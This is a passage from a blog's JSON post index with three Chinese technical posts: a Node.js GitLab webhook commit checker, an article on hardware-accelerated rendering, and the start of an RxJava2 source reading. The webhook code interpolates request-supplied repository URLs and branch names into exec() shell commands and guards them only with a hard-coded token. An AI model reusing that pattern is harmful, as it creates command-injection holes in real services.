OkHttp源码","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"}]},{"title":"基于gitlab的webhook搭建的commit检查服务","slug":"基于gitlab的webhook搭建的commit检查服务","date":"2019-03-03T09:53:14.000Z","updated":"2020-05-11T07:23:44.839Z","comments":true,"path":"2019/03/03/基于gitlab的webhook搭建的commit检查服务/","link":"","permalink":"https://superxlcr.github.io/2019/03/03/基于gitlab的webhook搭建的commit检查服务/","excerpt":"","text":"前言最近在项目里遇到了一点问题：某个里程碑因为git上merge失误的关系，不小心把下个里程碑的代码跟混进去了。由于缺乏有效的检查，加上QA童鞋回归时并没有测试某些极端的情况，在线上环境出了点问题，最后不得不重新发版解决。 痛定思痛，博主这边打算找些自动化的检查机制来避免以后再出现这种问题。我们这边版本管理工具用的是Redmine，其实我们组里一直都有在commit信息上带上相关单号的好习惯（如：[#000000]xxxxxxx），不过一般只有进行codeReview的时候才会用到考虑到最近项目迁移到了gitlab上，在某些特殊的时间能够触发webhook调用一些特定的url，博主决定自己搭一个nodejs服务器，在有push至gitlab的时候，对其commit的信息进行检查 流程获取commit信息当有push推送至gitlab服务器时，会触发gitlab的webhook中的Push events，具体的官方doc如下：https://docs.gitlab.com/ee/user/project/integrations/webhooks.html#push-events 根据doc可以看到，请求的body中会通过json格式带上一些我们感兴趣的信息值得注意的是，commits字段虽然有commit相关的信息，但是由于性能的缘故，只会有前20条相关的记录，而total_commits_count字段则会提供完整的commit数量 这该如何是好，总不能说当我们一次push太多commit去服务器的时候校验就失效了吧考虑到像develop与master分支一般都会有上百次commit一口气push上来，这个问题还是不容忽视的在参考了Jenkins构建项目时，其实是clone了一份代码至本地仓库来进行操作之后，博主也决定效仿：决定在nodejs服务上也clone一份本地仓库，当发生push时通过pull指令更新，最终使用log指令来获取完整的commit信息 值得注意的是，这里为了获取正确的git log顺序，使用了–topo-order拓扑排序的参数（这里主要为了解决merge之后git log直接拉取数据的话，前几条并不一定是最新在当前分支上的修改的问题，说实话参数的doc介绍没看的太懂） 流程设计流程图如下： 这里把实际检查工作放到一个队列中依次执行的原因主要是： 检查工作中包含多项异步处理（如：读取文件、更新代码、请求Redmine api数据）会比较耗时，此处应该尽快回复gitlab的webhook，避免webhook以为调用失败再次请求 由于使用本地仓库获取log日志的缘故，多个检查工作同时执行相关git指令可能会导致本地仓库出问题 相关代码仓库文件编辑工具123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const fs = require(\"fs\");const CONFIG_FILE_SUFFIX = \"_config\";exports.BRANCHES = \"branches\";exports.VERSION = \"version\";/** * 检查仓库的配置文件是否存在 * @param repositoryName 仓库名 * @param callback 回调是否存在文件 */exports.hasRepositoryConfigFile = function (repositoryName, callback) &#123; fs.exists(getFileName(repositoryName), function (exists) &#123; callback(exists); &#125;);&#125;;/** * 读取配置文件 * @param repositoryName 仓库名 * @param callback 回调解析的json对象 */exports.loadConfigFileData = function (repositoryName, callback) &#123; exports.hasRepositoryConfigFile(repositoryName, function (exists) &#123; if (exists) &#123; fs.readFile(getFileName(repositoryName), 'utf8', function (err, data) &#123; let object = &#123;&#125;; if (err) &#123; callback(object); return; &#125; try &#123; object = JSON.parse(data); &#125; catch (e) &#123; // ignore &#125; callback(object); &#125;) &#125; else &#123; callback(&#123;&#125;); &#125; &#125;);&#125;;/** * 写入配置文件 * @param repositoryName 仓库名 * @param object 配置对象 * @param callback 回调写入的错误 */exports.writeConfigFileData = function (repositoryName, object, callback) &#123; fs.writeFile(getFileName(repositoryName), JSON.stringify(object), err =&gt; &#123; callback(err); &#125;)&#125;;function getFileName(repositoryName) &#123; return \"./\" + repositoryName + CONFIG_FILE_SUFFIX;&#125; webhook校验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375const http = require(\"http\");const querystring = require(\"querystring\");const fs = require(\"fs\");const exec = require(\"child_process\").exec;const configFileUtils = require(\"./configFileUtils\");const EventEmitter = require(\"events\").EventEmitter;const logUtils = require(\"./logUtils\");const TOKEN_KEY = \"x-gitlab-token\";const TOKEN = \"Hello, Thank you, Thank you very much!\";const CHECK_EVENT = \"executeShell\";const INVALID_ORDER_KEY = \"invalid_order\";const orderPattern = new RegExp(\"\\\\[#\\\\d+]\");const event = new EventEmitter();const dataList = [];// 网络请求处理exports.handleRequest = function (req, res) &#123; let data = \"\"; req.on(\"data\", function (chunk) &#123; data += chunk; &#125;); req.on(\"end\", function () &#123; const tokenValid = req.headers[TOKEN_KEY] === TOKEN; try &#123; logUtils.log(\"### get new data from git hook ! ###\"); const body = JSON.parse(data); if (tokenValid &amp;&amp; body[\"object_kind\"] === \"push\") &#123; const repositoryName = body[\"repository\"][\"name\"]; configFileUtils.hasRepositoryConfigFile(repositoryName, function (exist) &#123; if (exist) &#123; dataList.push(body); event.emit(CHECK_EVENT); &#125; else &#123; logUtils.error(`the repository $&#123;repositoryName&#125; can not get config file, just ignore it`); &#125; &#125;); &#125; else &#123; logUtils.error(\"token invalid or not push event, just ignore it\"); &#125; &#125; catch (e) &#123; // ignore logUtils.error(\"catch error in parse data ? , just ignore it\"); &#125; res.writeHead(tokenValid ? 200 : 404); res.end(); &#125;); req.on(\"error\", function (err) &#123; logUtils.error(`req on error : $&#123;err&#125;`); &#125;);&#125;;// 开始检查提交内容let checking = false;event.on(CHECK_EVENT, function () &#123; if (checking || dataList.length === 0) &#123; logUtils.log(\"### is in checking or not more check to do, pass check event ! ###\"); return; &#125; checking = true; logUtils.log(\"begin check\"); try &#123; const data = dataList.pop(); const repositoryName = data[\"repository\"][\"name\"]; const repositoryUrl = data[\"repository\"][\"url\"]; const branchName = data[\"ref\"].replace(\"refs/heads/\", \"\"); const hashCode = data[\"after\"]; const commitCount = data[\"total_commits_count\"]; const userName = data[\"user_name\"]; const userEmail = data[\"user_email\"]; let configObject; logUtils.log(`hook data repositoryName($&#123;repositoryName&#125;) repositoryUrl($&#123;repositoryUrl&#125;) branchName($&#123;branchName&#125;)`); logUtils.log(`hook data commitCount($&#123;commitCount&#125;) userName($&#123;userName&#125;) userEmail($&#123;userEmail&#125;) hashCode($&#123;hashCode&#125;)`); // 加载配置文件 loadConfigFile(repositoryName).then(object =&gt; &#123; configObject = object; return checkBranchName(branchName, configObject); // 检查分支名，是否要检测的分支 &#125;).then(() =&gt; updateLocalRepository(repositoryName, repositoryUrl) // 更新本地仓库 ).then(() =&gt; checkOutBranch(repositoryName, branchName, hashCode) // 分支切换 ).then(() =&gt; collectCommitMessages(repositoryName, commitCount, configObject) // 收集提交信息，返回 orderMessagesMap 与 configObject ).then(orderMessagesMap =&gt; checkCommitMessagesByRedmine(repositoryName, orderMessagesMap, configObject) // 检查提交信息 ).then(badOrderMessagesAndVersionMap =&gt; &#123; notifyUserBadCommitMessages(badOrderMessagesAndVersionMap, userName, repositoryName, branchName, userEmail, configObject); // 错误提交信息通知 endCheck(); &#125;).catch(function (message) &#123; logUtils.error(message); // 异常打印 endCheck(); &#125;); &#125; catch (e) &#123; // ignore logUtils.error(e); endCheck(); &#125;&#125;);function endCheck() &#123; if (checking) &#123; logUtils.log(\"end check\"); checking = false; event.emit(CHECK_EVENT); &#125;&#125;function loadConfigFile(repositoryName) &#123; return new Promise((resolve, reject) =&gt; &#123; configFileUtils.loadConfigFileData(repositoryName, object =&gt; &#123; if (Object.keys(object).length &gt; 0) &#123; logUtils.log(\"load config file success\"); resolve(object); &#125; else &#123; reject(`empty config file for $&#123;repositoryName&#125;`); &#125; &#125;) &#125;)&#125;function checkBranchName(branchName, configObject) &#123; return new Promise((resolve, reject) =&gt; &#123; try &#123; const branches = configObject[configFileUtils.BRANCHES]; for (let i = 0; i &lt; branches.length; i++) &#123; if (branches[i] === branchName) &#123; logUtils.log(\"check branch name success\"); resolve(); return; &#125; &#125; &#125; catch (e) &#123; &#125; reject(\"not valid branch !\") &#125;)&#125;function updateLocalRepository(repositoryName, repositoryUrl) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.exists(\"./\" + repositoryName, exists =&gt; &#123; const cmd = exists ? \"git pull\" : `git clone $&#123;repositoryUrl&#125;`; const cwd = exists ? `./$&#123;repositoryName&#125;/` : \".\"; exec(cmd, &#123;cwd: cwd&#125;, error =&gt; &#123; if (error) &#123; logUtils.error(error); reject(\"error in update local repository !\"); &#125; else &#123; logUtils.log(\"update local repository success\"); resolve(); &#125; &#125;); &#125;) &#125;);&#125;function checkOutBranch(repositoryName, branchName, hashCode) &#123; return new Promise((resolve, reject) =&gt; &#123; const cwd = `./$&#123;repositoryName&#125;/`; exec(\"git checkout -B check remotes/origin/\" + branchName, &#123;cwd: cwd&#125;, error =&gt; &#123; if (error) &#123; logUtils.error(error); reject(\"error in check out branch !\"); &#125; else &#123; // 检查当前位置的哈希值是否正确 exec(\"git log --pretty=format:\\\"%H\\\" -n 1\", &#123;cwd: cwd&#125;, (error, stdout) =&gt; &#123; if (error) &#123; logUtils.error(error); reject(\"error in check out branch !\"); &#125; else if (stdout === hashCode) &#123; logUtils.log(\"check out branch success !\"); resolve(); &#125; else &#123; reject(`the sha hash in current commit ($&#123;stdout&#125;) is not match !`); &#125; &#125;); &#125; &#125;); &#125;);&#125;function collectCommitMessages(repositoryName, commitCount) &#123; return new Promise((resolve, reject) =&gt; &#123; const cwd = \"./\" + repositoryName + \"/\"; exec(`git log --pretty=format:\\\"%s\\\" --topo-order -n $&#123;commitCount&#125;`, &#123;cwd: cwd&#125;, (error, stdout) =&gt; &#123; if (error) &#123; logUtils.error(error); reject(\"error in collect commit messages !\"); return; &#125; const messages = stdout.split(\"\\n\"); const orderMessagesMap = &#123;&#125;; for (let i = 0; i &lt; messages.length; i++) &#123; logUtils.log(`collect message index $&#123;i&#125; : $&#123;messages[i]&#125;`); // Merge操作，直接跳过 if (messages[i].startsWith(\"Merge\")) &#123; continue; &#125; // 解析单号 const resultArray = orderPattern.exec(messages[i]); if (!resultArray) &#123; if (!orderMessagesMap[INVALID_ORDER_KEY]) &#123; orderMessagesMap[INVALID_ORDER_KEY] = []; &#125; orderMessagesMap[INVALID_ORDER_KEY].push(messages[i]); continue; &#125; // 单号解析成功 const order = resultArray[0].substr(2, resultArray[0].length - 3); if (!orderMessagesMap[order]) &#123; orderMessagesMap[order] = []; &#125; orderMessagesMap[order].push(messages[i]); &#125; logUtils.log(\"collect commit messages success !\"); resolve(orderMessagesMap); &#125;); &#125;);&#125;// 这个key可以去redmine的/my/account页面右边获取const REDMINE_KEY = \"xxx\";function checkCommitMessagesByRedmine(repositoryName, orderMessagesMap, configObject) &#123; return new Promise((resolve, reject) =&gt; &#123; const orders = []; const badOrderMessagesAndVersionMap = &#123;&#125;; // order -&gt; messages , version for (let order in orderMessagesMap) &#123; if (!orderMessagesMap.hasOwnProperty(order)) &#123; continue; &#125; if (order === INVALID_ORDER_KEY) &#123; badOrderMessagesAndVersionMap[order] = &#123;messages: orderMessagesMap[order], version: \"\"&#125;; &#125; else if (order !== \"0\") &#123; // 过滤单号为 0 的提交 orders.push(order); &#125; &#125; let ordersStr = \"\"; for (let i = 0; i &lt; orders.length; i++) &#123; if (i !== 0) &#123; ordersStr += \"|\"; &#125; ordersStr += orders[i]; &#125; if (ordersStr.length === 0) &#123; // 没有需要检查的单号 logUtils.log(\"check commit messages by redmine success !\"); resolve(badOrderMessagesAndVersionMap); &#125; else &#123; // 请求redmine获取单号的里程碑 const data = &#123; key: REDMINE_KEY, issues_id: ordersStr, status_id: \"*\", limit: orders.length &#125;; const option = &#123; hostname: \"xxx\", port: xxx, path: \"/issues.json?\" + querystring.stringify(data), method: \"GET\" &#125;; http.request(option, res =&gt; &#123; logUtils.log(`redmine status code : $&#123;res.statusCode&#125;`); let data = \"\"; res.on(\"data\", chunk =&gt; &#123; data += chunk; &#125;); res.on(\"end\", () =&gt; &#123; try &#123; const object = JSON.parse(data); const orderVersionMap = &#123;&#125;; if (object[\"issues\"]) &#123; for (let i = 0; i &lt; object[\"issues\"].length; i++) &#123; const issue = object[\"issues\"][i]; orderVersionMap[issue[\"id\"]] = issue[\"fixed_version\"][\"name\"].trim(); &#125; &#125; // 检查每个单号的里程碑是否合法 const validVersion = configObject[configFileUtils.VERSION].trim(); for (let i = 0; i &lt; orders.length; i++) &#123; const order = orders[i]; // redmine 解析里程碑失败 if (!orderVersionMap[order]) &#123; logUtils.log(`check commit messages order $&#123;order&#125; fail with no version !`); badOrderMessagesAndVersionMap[order] = &#123; messages: orderMessagesMap[order], version: \"\" &#125;; continue; &#125; const version = orderVersionMap[order]; if (version !== validVersion) &#123; logUtils.log(`check commit messages order $&#123;order&#125; fail with version : $&#123;version&#125; !`); badOrderMessagesAndVersionMap[order] = &#123; messages: orderMessagesMap[order], version: version &#125;; &#125; &#125; logUtils.log(\"check commit messages by redmine success !\"); resolve(badOrderMessagesAndVersionMap); &#125; catch (e) &#123; logUtils.error(e); reject(\"check commit messages by redmine fail !\") &#125; &#125;) &#125;).end(); &#125; &#125;);&#125;function notifyUserBadCommitMessages(badOrderMessagesAndVersionMap, userName, repositoryName, branchName, userEmail, configObject) &#123; // 解析提交信息，生成错误信息 let badCommitsMessages = []; let errorMessages = []; let counter = 0; for (let order in badOrderMessagesAndVersionMap) &#123; if (!badOrderMessagesAndVersionMap.hasOwnProperty(order)) &#123; continue; &#125; counter++; const messages = badOrderMessagesAndVersionMap[order][\"messages\"]; for (let i = 0; i &lt; messages.length; i++) &#123; badCommitsMessages.push(messages[i]); &#125; if (order === INVALID_ORDER_KEY) &#123; errorMessages.push(\"存在不规范的提交信息编写\"); &#125; else if (badOrderMessagesAndVersionMap[order][\"version\"]) &#123; errorMessages.push(`单号 $&#123;order&#125; 的周里程碑为 $&#123;badOrderMessagesAndVersionMap[order][\"version\"]&#125;`); &#125; else &#123; errorMessages.push(`单号 $&#123;order&#125; 无法从redmine解析出正确的周里程碑`); &#125; &#125; // 无需提醒，直接退出 if (counter === 0) &#123; logUtils.log(\"no need to notify, just return !\"); return; &#125; // 拼接字符串 let errorMessagesStr = \"\"; for (let i = 0; i &lt; errorMessages.length; i++) &#123; errorMessagesStr += `$&#123;i + 1&#125;. $&#123;errorMessages[i]&#125;\\n`; &#125; let badCommitsMessagesStr = \"\"; for (let i = 0; i &lt; badCommitsMessages.length; i++) &#123; badCommitsMessagesStr += `$&#123;i + 1&#125;. $&#123;badCommitsMessages[i]&#125;\\n`; &#125; let notifyMessage = `警告！本次合法的周里程碑为 \"$&#123;configObject[configFileUtils.VERSION].trim()&#125;\"\\n$&#123;userName&#125;童鞋，您刚刚往 $&#123;repositoryName&#125; 仓库中的 $&#123;branchName&#125; 分支推送的代码内，包含以下问题：\\n$&#123;errorMessagesStr&#125;\\n请对以下提交信息进行确认：\\n$&#123;badCommitsMessagesStr&#125;`; // 使用popo机器人进行通知 const uid = userEmail.indexOf(\"@\") !== -1 ? userEmail.split(\"@\")[0] : null; if (!uid) &#123; logUtils.log(\"can not notify with empty uid, just return !\"); return; &#125; const data = &#123; uid: uid, msg: notifyMessage &#125;; const option = &#123; hostname: \"xxx\", port: xxx, path: \"/api/post_popo?\" + querystring.stringify(data), method: \"GET\" &#125;; http.request(option).end(); logUtils.log(\"send notify success !\");&#125;","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/tags/杂项/"},{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"当我们在说硬件加速渲染，具体指的是什么？","slug":"当我们在说硬件加速渲染，具体指的是什么？","date":"2019-02-20T03:11:19.000Z","updated":"2020-05-11T07:23:44.848Z","comments":true,"path":"2019/02/20/当我们在说硬件加速渲染，具体指的是什么？/","link":"","permalink":"https://superxlcr.github.io/2019/02/20/当我们在说硬件加速渲染，具体指的是什么？/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/afb2c6c4ce10 不管Android iOS 还是Web前端 随着UI图形界面的发展，或多或少甚至经常听到硬件加速这个术语。当通过设置某个参数，界面滑动效率变好了。我们都会说硬件加速起作用了。但是终究什么是硬件加速，又加速了什么？大多数人估计还是一知半解，网上相关资料也是比较少的，所以我们今天来探讨一下神秘的硬件加速。 计算机成像的原理计算机和显示器之间通过特定驱动协议通信，程序需要做的事情只是绘制出需要显示的位图（一般由RGBA三个8位次像素组成二维数组，格式可以通过协议互相协商。具体看硬件支持什么格式，比如Alpha通道对屏幕显示就没什么用），然后通过系统驱动接口把二进制数据发送给显示器（比如linux的 /dev/fb0 设备符号，directFB等等），由显示器的硬件把颜色显示到屏幕上去。 所以程序要做的事情就是快速生成当前需要上屏的位图。那么可能有人要问了 “我玩的3D游戏感觉好像不是这样的吧？”，实际上现有的3D渲染方式第一步就是把3D位置数据转化成2D平面数据。 位图生成的原理问题的关键 在于程序如何生成这个位图，主流的生成算法主要有2种： 基于线性扫描算法（目前基本上和用户直接有交互的UI系统，全是基于这个算法） 光线跟踪算法（主要用来渲染真实世界，比如大家看的变形金刚电影就是采用此类算法渲染的，渲染单帧的时间可能非常非常长）这里主要讨论线性扫描算法，光线跟踪算法以后有机会慢慢讨论。 比如程序需要绘制上面这样的三角形，算法很简单： 123456789void draw(rgba** buffer, int width, int height) &#123; for (int i = 0; i &lt; width; ++i) &#123; for (int j = 0; j &lt; height; ++j) &#123; if (is_position_in_path_region(i, j)) &#123; buffer[i][j] = rgba(0, 0, 0, 1); &#125; &#125; &#125;&#125; 当然这是一个简单的绘制，那么如果我们要绘制一个半透明的三角形（三角形背后已经有一个红色的圆）应该咋办？ 12345678910111213141516rgba draw_color = rgba(0, 0, 0, 0.5);void draw(rgba** buffer, int width, int height) &#123; float alpha = draw_color.a; for (int i = 0; i &lt; width; ++i) &#123; for (int j = 0; j &lt; height; ++j) &#123; if (is_position_in_path_region(i, j)) &#123; rgba back_color = get_current_back_color(i, j); rgba blend_color; blend_color.r = (1 - alpha) * draw_color.r + alpha * back_color.r; blend_color.g = (1 - alpha) * draw_color.g + alpha * back_color.g; blend_color.b = (1 - alpha) * draw_color.b + alpha * back_color.b; buffer[i][j] = blend_color; &#125; &#125; &#125;&#125; 上面的算法解释了AlphaBlend（通过Alpha通道做颜色融合），上下这2段代码表达了简单的像素染色的算法。由于此类算法通常都是类似这样的一个循环，这个过程类似于扫描仪的扫描过程，所以又叫线扫描像素填充。由于位图主要提供给光栅显示器显示使用，所以位图又叫光栅图，那么生成光栅图的算法过程又叫光栅化过程。综上所述整个过程又叫做线扫描光栅化。 Tips: 上面的算法主要是把简单的图形光栅化，那么实际情况存在的形状非常之多。那么如何能表达那么多复制的图形（比如螺旋圆环）。工业上存在众多曲线拟合算法，用来拟合各种复杂曲线。其中最好用的数学曲线叫做贝塞尔曲线（贝塞尔曲线并不是贝塞尔发明的，只是贝塞尔首次在论文里面提出使用这个曲线来拟合工业图形）。所以常规我们都喜欢使用贝塞尔曲线来描述图形，描述一个图形只要存储该图形的贝塞尔参数就可以了,并且曲线是由通过公式计算出来的，所以可以无限放缩（所以图形又叫矢量图形，矢量是2D的灵魂，贝塞尔曲线又是矢量的灵魂）。 位图生成算法性能问题通过上面的矢量扫描填充算法，我们很容易的发现了有2个可能会出现的性能问题： 大量的循环处理，每个涉及的像素都要处理一遍（按照现在手机的分辨率，算算一帧有多少要处理的） 颜色融合其实就是浮点数插值算法，对每个次像素都要做，运算量巨大 那么如何解决这2个问题？ 对于像素太多的问题，最好的办法就是脏区域渲染。用人类话来说就是每次渲染的时候，最大化的在上一帧的基础上面进行，对本次这帧没有变化的像素来说直接忽略处理。 对于浮点数运算太多，可以通过多媒体指令来加速。比如：ARM Neon Intel MMX SSE 等等。以ARM为例,ARM有 16个通用计算寄存器，16个Neon指令寄存器，16个VFP高精度浮点数运算加速器。其中Neon指令可以让程序在一个指令周期里面计算8个浮点数的运算，理想的情况下相当于比传统的浮点运算性能提升了8倍。当然这些指令主要就是用来处理多媒体的，所以又叫多媒体指令 也叫 SIMD指令（Single Instruction Multiple Data，单指令多数据流，Android的底层绘图库就有基于Neon的优化器，我也尝试过用SSE指令优化Windows平台API AlphaBlend函数）。 那么这些都被叫做传统方法，那么硬件加速具体用的是什么方式来加速这个过程的？ 图形硬件和硬件的渲染方式传统的图形硬件主要指的是GPU，渲染接口主要有5种： title 常规 Opengl 基本在所有平台都能用，基于状态机的接口设计也是醉了 Metal 水果公司独有的，其他平台别指望了 Vulkan 新版的图形接口，未来可能取代Opengl DirectX Windows平台特有的图形接口 OpenVG 专注于矢量加速的硬件接口，基本上没啥人用 就拿Android来说吧，作为操作系统需要兼容各种硬件。硬件接口比较通用的就是OpenGL（其实早些年SGL在定义硬件的标准的时候，2D和3D是分开定义，2D用OpenVG加速，3D用OpenGL加速。只是后面OpenVG没有成为事实标准），Windows是基于DX3D接口实现的，但是原理也是类似。 那么硬件究竟是如何利用Opengl接口操作硬件来加速光栅化过程？这个要看看Opengl定义的规范了。 Opengl的渲染加速的原理首先Opengl只能渲染 点 直线 三角形（之所以硬件指定是三角形。 主要是因为光栅化也就是插值的过程, 当多边形是凸多边形的时候最容易处理，硬件也只支持凸多边形的插值。 三角形在三维变换后任然是凸多边形, 而四边形或者更高边数的形状在变换后可能会出现凹多边形。其次其他形状都可以细分成三角形。）。 对字母A的图形做三角剖分 当程序需要绘制一个多边形的时候，首先需要将这个多边形剖分成多个三角形，这个过程被称之为三角剖分（剖分算法分2大类，几何剖分和点云剖分）。被剖分出来的三角形，提交给显卡。显卡对每个三角形的扫描填充和像素融合处理是像素间无关的所以这类运算完全可以并行处理。GPU的并行处理每个三角形和三角形的像素染色，每个渲染流水称之为渲染管线。CPU在处理的过程中每次最多操作一个像素，而显卡每次可能有几千上万甚至十万的管线并行计算，其次显然的浮点数运算性能比CPU高非常多。这个就是显卡为什么能够加速这个过程。 Android的HWUI的源码中摘抄了一段： Code Path： android / platform / frameworks / base / master / . / libs / hwui / PathTessellator.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970/* * Copyright (C) 2012 The Android Open Source Project * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */#ifndef ANDROID_HWUI_PATH_TESSELLATOR_H#define ANDROID_HWUI_PATH_TESSELLATOR_H#include \"Matrix.h\"#include \"Rect.h\"#include \"Vertex.h\"#include \"VertexBuffer.h\"#include &lt;algorithm&gt;#include &lt;vector&gt;class SkPath;class SkPaint;namespace android &#123;namespace uirenderer &#123;/** * Structure used for threshold values in outline path tessellation. * * TODO: PaintInfo should store one of this object, and initialized all values in constructor * depending on its type (point, line or path). */struct PathApproximationInfo &#123; PathApproximationInfo(float invScaleX, float invScaleY, float pixelThreshold) : thresholdSquared(pixelThreshold * pixelThreshold) , sqrInvScaleX(invScaleX * invScaleX) , sqrInvScaleY(invScaleY * invScaleY) , thresholdForConicQuads(pixelThreshold * std::min(invScaleX, invScaleY) / 2.0f) &#123; &#125;; const float thresholdSquared; const float sqrInvScaleX; const float sqrInvScaleY; const float thresholdForConicQuads;&#125;;class PathTessellator &#123;public: /** * Populates scaleX and scaleY with the 'tessellation scale' of the transform - the effective X * and Y scales that tessellation will take into account when generating the 1.0 pixel thick * ramp. * * Two instances of the same shape (size, paint, etc.) will only generate the same vertices if * their tessellation scales are equal. */ static void extractTessellationScales(const Matrix4&amp; transform, float* scaleX, float* scaleY); /** * Populates a VertexBuffer with a tessellated approximation of the input convex path, as a single * triangle strip. Note: joins are not currently supported. * * @param path The path to be approximated * @param paint The paint the path will be drawn with, indicating AA, painting style * (stroke vs fill), stroke width, stroke cap &amp; join style, etc. * @param transform The transform the path is to be drawn with, used to drive stretch-aware path * vertex approximation, and correct AA ramp offsetting. * @param vertexBuffer The output buffer */ static void tessellatePath(const SkPath&amp; path, const SkPaint* paint, const mat4&amp; transform, VertexBuffer&amp; vertexBuffer);...... 这段代码就是HWUI中对路径做的的三角剖分处理。Opengl绘制几何图形存在的性能瓶颈 主要有以下3点： 三角剖分性能，如果我们需要绘制一个复杂的多边形，那么首先需要把这个多边形剖分成一个个三角形。这个剖发需要耗时 由于早期的GPU是作为外设链接到CPU上面的，所以GPU的RAM是和系统的内存是分开的。所以数据需要通过系统BUS发送给显卡，这过程也占据了大量的运行时间。 每次提交一次渲染就做一次DrawCal，渲染的开始是管线重启。由于Opengl的API缺陷，DrawCall非常贵重，DrawCall甚至一度被用来衡量软件渲染的性能好坏。 Opengl绘制的优势 主要有以下3点: 硬件插值器实现的光栅化算法，性能飞快 GPU天生的浮点数运算能力，在前后景图Blend过程中可以飞快 硬件天生的并行运算特性 硬件就一定能加速么？ 如果只是一个很简单的图形，那么CPU直接渲染的速度回更快。也就是：（CPU颜色填充时间 &lt; 三角剖分的时间+数据通信的时间+GPU光栅的时间）。比如Android的图形基础库Skia就有基于Opengl的加速的优化模块，Google给出了基于硬件加速后的API性能和CPU运算下的API的性能比较，你会发现并不是所有的绘制接口都有速度提升，甚至有部分API速度慢了十倍以上。 以上就是硬件加速在传统图形界面中的位置，就目前来看硬件的确是加速了图形的渲染，但是是不是所有场景都能加速？硬件加速是不是图形渲染的万金油？还是要理解其中的原理，方能善用。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"RxJava2源码阅读","slug":"RxJava2源码阅读","date":"2019-01-14T03:28:57.000Z","updated":"2020-05-11T07:23:44.731Z","comments":true,"path":"2019/01/14/RxJava2源码阅读/","link":"","permalink":"https://superxlcr.github.io/2019/01/14/RxJava2源码阅读/","excerpt":"","text":"前言ReactiveX，是一套用可观察流来完成异步编程的api，它的官网是：http://reactivex.io/而RxJava，则是ReactiveX为Java语言平台提供的api，目前最新版本为2.2.5，github地址为：https://github.com/ReactiveX/RxJava 博主也在项目中使用了RxJava相关的api，惊叹于其神奇的链式调用，消除了复杂的异步编程层层嵌套导致的回调地狱，并把逻辑流程梳理清晰最近刚好有空，在阅读了RxJava的源码后，在此写下一篇博客记录一下体会 博主阅读的是RxJava2版本的源码，与RxJava1的版本源码有较大出入本文旨在分析RxJava2源码中流程相关的部分，基础的使用方式以及一些操作符说明请自行查询相关文档 例子引入假设我们这里有这么一个场景：有一系列的学生数据，我们需要把他们的所有id打印到logCat，然后再把其中的偶数id再次打印，如果熟悉RxJava的童鞋肯定会写出下面相似的代码： 123456789101112131415161718192021222324252627282930313233343536Observable.create(new ObservableOnSubscribe&lt;Student&gt;() &#123; @Override public void subscribe(ObservableEmitter&lt;Student&gt; emitter) &#123; List&lt;Student&gt; list = getStudentList(); for (Student student : list) &#123; emitter.onNext(student); &#125; &#125;&#125;) .map(new Function&lt;Student, Integer&gt;() &#123; @Override public Integer apply(Student student) &#123; return student.id; &#125; &#125;) .observeOn(Schedulers.newThread()) .doOnNext(new Consumer&lt;Integer&gt;() &#123; @Override public void accept(Integer integer) &#123; Log.i(TAG, String.valueOf(integer)); &#125; &#125;) .filter(new Predicate&lt;Integer&gt;() &#123; @Override public boolean test(Integer integer) &#123; return integer % 2 == 0; &#125; &#125;) .subscribeOn(Schedulers.io()) .observeOn(AndroidSchedulers.mainThread()) .subscribe(new Consumer&lt;Integer&gt;() &#123; @Override public void accept(Integer integer) &#123; Log.i(TAG, String.valueOf(integer)); &#125; &#125;); 简单介绍下上面代码完成的事情： 我们通过Observable#create方法，创建了一个发射学生Student数据的数据源 通过map操作符，我们从Student中获取他们的id 通过observeOn操作符，我们定义下面的工作将在一个新线程中执行 通过doOnNext操作符，我们打印出所有学生的id 通过filter操作符，我们过滤出其中的偶数学生id 通过subscribeOn操作符，我们定义数据源的发射操作在io线程中执行 通过observeOn操作符，我们定义下面的工作将在Android主线程中执行 通过subscribe方法，我们打印出剩下的偶数学生id 源码分析值得注意的是，博主在RxJava的github例子上发现了一段话，它告诉了我们RxJava的流程设计是怎么样子的，相信当我们浏览完源码后再回来看会有更深的体会原文如下： This style of chaining methods is called a fluent API which resembles the builder pattern. However, RxJava’s reactive types are immutable; each of the method calls returns a new Flowable with added behavior. 这段话告诉了我们RxJava中的响应类型是不变的，每次方法的调用都是通过生成一个新的对象来添加新的行为这很容易就让人联想到了使用装饰器模式实现的javaIo，看完源码之后我们会发现两者确实有共通之处 